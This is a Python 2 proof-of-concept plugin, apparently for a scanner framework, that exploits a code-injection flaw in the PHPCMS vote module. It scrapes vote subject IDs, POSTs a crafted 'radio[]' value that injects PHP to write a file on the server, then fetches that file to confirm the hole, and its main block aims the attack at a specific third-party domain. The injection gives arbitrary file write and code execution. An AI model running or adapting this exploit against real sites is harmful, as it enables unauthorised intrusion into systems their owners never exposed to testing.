# !/usr/bin/dev python
# -*- coding:utf-8 -*-

"""
reference:
http://www.wooyun.org/bugs/wooyun-2015-0104157
http://www.beebeeto.com/pdb/poc-2015-0086/
"""

import re
import urllib
import urllib2
import base64
import random


def get_vote_links(args):
    vul_url = args
    vote_url = '%sindex.php?m=vote' % vul_url
    code, head, res, _, _ = curl.curl(vote_url)
    ids = []
    for miter in re.finditer(r'<a href=.*?subjectid=(?P<id>\d+)', res, re.DOTALL):
        ids.append(miter.group('id'))
    if len(ids) == 0:
        return None
    return list(set(ids)) 


def assign(service, args):
    if service == 'phpcms':
        return True, args
    pass


def audit(args):
    vul_url = args
    ids = get_vote_links(args)
    file_name = 'w2x5Tt_%s.php' % random.randint(1,3000)
    base64_name = base64.b64encode(file_name)
    if ids:
        for i in ids:
            exploit_url = '%sindex.php?m=vote&c=index&a=post&subjectid=%s&siteid=1' % (vul_url, i)
            payload = {'subjectid': 1,
                       'radio[]': ');fputs(fopen(base64_decode(%s),w),"vulnerable test");' % base64_name}
            post_data = urllib.urlencode(payload)
            code,head,body,_,_=curl.curl('-d "%s" %s' % (post_data, exploit_url))
            if code==200:
                verify_url = '%sindex.php?m=vote&c=index&a=result&subjectid=%s&siteid=1' % (vul_url, i)
                code,head,body,_,_=curl.curl(verify_url)
                if code==200:
                    shell_url = '%s%s' % (vul_url, file_name)
                    code, head, res, _, _ = curl.curl(shell_url)
                    if code == 200 and 'vulnerable test' in res:
                        security_hole(vul_url)


if __name__ == "__main__":
    from dummy import *
    audit(assign('phpcms', 'http://www.jkb.com.cn/')[1])